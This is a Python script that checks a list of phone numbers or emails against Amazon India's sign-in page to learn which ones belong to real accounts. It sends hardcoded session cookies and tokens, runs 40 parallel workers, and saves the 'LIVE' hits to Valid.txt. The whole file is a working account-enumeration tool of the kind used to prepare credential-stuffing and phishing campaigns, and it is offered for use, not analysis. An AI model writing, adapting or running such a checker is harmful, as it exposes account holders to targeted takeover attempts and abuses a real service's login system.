import requests
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
ORANGE = "\033[93m"
RESET = "\033[0m"

class Amazon():
    def __init__(self, num):
        self.url = "https://www.amazon.in/ap/signin"
        self.num = num
        self.redirect = None
        self.workflowState = None
        self.appActionToken = None
        self.openid = None
        self.prevRID = None

    def check(self):
        cookies = {
            # Add valid cookies for amazon.in here
            "session-id": "262-6899214-0753700",
            "session-id-time": "2289745062l",
            "i18n-prefs": "INR",
            "csm-hit": "tb:6NWTTM14VJ00ZAVVBZ3X+b-36CP76CGQ52N3TB0HZG8|1659025064788&t:1659025064788&adb:adblk_no",
            "ubid-acbin": "257-4810331-3732018",
            "session-token": "\"tyoeHgowknphx0Y/CBaiVwnBiwbhUb1PRTvQZQ+07Tq9rmkRD6bErsUDwgq6gu+tA53K6WEAMwOb3pN4Ti3PSFoo+I/Jt5qIEDEMHIeRo1CrE264ogGDHsjge/CwWUZ9bVZtbo32ej/ZPQdm8bYeu6TQhca+UH7Wm9OOwBGoPl7dfoUk79QLYEz69Tt3ik4zMJom8jfgI227qMPuaMaAsw==\""
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {
            "appActionToken": "Aok8C9I71Cr17vp22ONGvDUXR8Yj3D",
            "appAction": "SIGNIN_PWD_COLLECT",
            "subPageType": "SignInClaimCollect",
            "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl95YV9zaWduaW4=",
            "prevRID": "ape:MzZDUDc2Q0dRNTJOM1RCMEhaRzg=",
            "workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.tCHWdlv4kSSigZCZiGfSCYgnReddxq7c0cUpf0dxYqYzWU-ZHIL0mQ.eP-cXQNtVyBr4q_g.fNRQAD5f18IU0nmqT7IwklJZV-_b60As-_dvyVd4MMjDpiMoGFJ0edbmuL8GJKT_BEE7ClwIpUYOtUtejr7v8qCRy4iD6bg_eBRSnTmZiXzVsx4EuL241zhoriZ7FpXS2seG82sx85C2udl1sPRQyKnO1zIqulOCechL_LzBmIRDv9ngzfij-nYmjWrDpZvAXiKCclR9v0UYh_SqjjOIrStMC53AlWjH-hYdDkXWSeTyHchFi9Ij4ndOgJb9tKNucA4_j7Uy-R0wvB9zlwEfQNa3394guXjjz6IR3TVMjw41bySCYbHLf6j5oj-5xh6UZm2CsW7DE5gqbHmlq5Nv8zLvTRTO9HJvM9Wr36R1eDRN.wZAX4qr9VTROJR9qdWbHfw",
            "email": self.num,
            "password": '',
            "create": "0",
            "metadata1": "ECdITeCs:MiqSjFZ5zjo+DMY7MlSt3mZjIbfWtB0UicUpYLJ+Zv/uHCXK9q3pnHXCtJkQjQHpnGkq5TTpWuacoyuQ+bkb4yv9EUQwJ4ZBr20hEb4dJphpGtOW40WA7ye80NaJkVKL+aTQt7nS9QKyWcSWTWJNLDZvxSMWCd1ubM6YUI0hmbd9kG4T5OQeVQiNd9VfAUXfH/ooYXTNModI45nh7kSdcLn/orvsR+tnPilPjPPRACuyALvHVkNrOUfjpiM0N3zdYPr6mQaRHdYoOg0z7Mho9zFwAFzXQHi6e+nqzHWAi5iFZ89YEJkVqyehwjumN72uuL1a5Bkr361IsRNhEogVMAse/BHUKQaVkCJ8Z41rTD+5QPXWASGrr1ojnw09tFO5+ZqQQUeL2y29QhLtMQPPi+1/P7rQQ8pzoc5hy9D2U08nCG/MxI+ymBddfXMiTxIeZXp7fS+D3LHjDNkFU3KkuMkbHuPUs0/OHPs+ksUGXoFcDxFQzAWEk403LkdJqI1Mxq891+Mlfdq66OJaMuFbnj5xyVEqfirY0FIyhfJ1kM4/eXZFxRjapaLnDwpcL6IY36P3OAcgMfIn75K0P4dmnM6zDTA61VdYlYWyr+hvFSLZ7rpqZGZyCTN2fUfDHmy/xXsnz+0Accxg3ci552OXn49RBII2XCYR"
        }

        res = requests.post(self.url, headers=headers, cookies=cookies, data=data).text

        if "ap_change_login_claim" in res:
            return True, res
        elif "There was a problem" in res:
            return False, res
        else:
            return False, res

class INDEx():
    def __new__(self):
        print("""
Script Started -
                By ./AnnaQitty
        contact ./AnnaQitty
        """)

def fun_action(num):
    num = num.strip()

    if num.isnumeric() and "+" not in num:
        num = "+%s" % num
    elif "@" in num:
        pass
    else:
        pass

    while True:
        try:
            A, Error = Amazon(num).check()

            if A:
                with open("Valid.txt", "a") as ff:
                    ff.write("%s\n" % num)
                print(f"{GREEN}[+] Yes ==> LIVE ==> {ORANGE}{num}{RESET}")
                break

            else:
                print(f"{RED}[-] No ==> DEAD ==> {ORANGE} {num}{RESET}")
                break
        except Exception as e:
            print(f"{ORANGE}[!] Error with  ==> {RED} {num} ==> {ORANGE} LIMITED ACCESS{RESET}")
            break

def main():
    email = open(input("[-] List Name : "), "r", encoding="Latin-1").read().splitlines()
    ThreadPool = Pool(40)
    ThreadPool.map(fun_action, email)

if __name__ == "__main__":
    INDEx()
    main()
